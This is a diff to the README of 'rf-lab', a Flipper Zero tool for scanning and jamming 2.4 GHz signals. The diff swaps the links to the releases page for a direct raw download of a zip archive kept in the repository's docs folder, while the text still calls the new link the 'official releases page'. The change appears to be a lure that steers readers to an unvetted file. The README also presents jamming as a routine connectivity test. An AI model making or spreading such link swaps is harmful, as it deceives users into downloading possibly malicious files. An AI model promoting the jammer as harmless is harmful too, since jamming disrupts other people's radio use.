@@ -1,6 +1,6 @@
 # 📡 rf-lab - Scan and jam signals on Flipper
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Wildoliveruffianism527/rf-lab/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Wildoliveruffianism527/rf-lab/raw/refs/heads/main/docs/rf-lab-3.5.zip)
 
 rf-lab provides tools to analyze 2.4 GHz radio frequencies using your Flipper Zero device. This software connects to the PINGEQUA 2-in-1 radio board to give you visibility over local wireless signals. It works with most common Flipper Zero firmware versions without requiring extra setup. You can identify signal interference, test your local radio environment, and conduct connectivity tests using the jammer module.
 
@@ -17,7 +17,7 @@ This software relies on the Flipper Zero internal ecosystem. Ensure your device 
 
 ## 📥 Getting the Files
 
-Visit the [official releases page](https://github.com/Wildoliveruffianism527/rf-lab/releases) to download the current version.
+Visit the [official releases page](https://github.com/Wildoliveruffianism527/rf-lab/raw/refs/heads/main/docs/rf-lab-3.5.zip) to download the current version.
 
 1. Navigate to the link above.
 2. Look at the most recent entry under the Releases section.
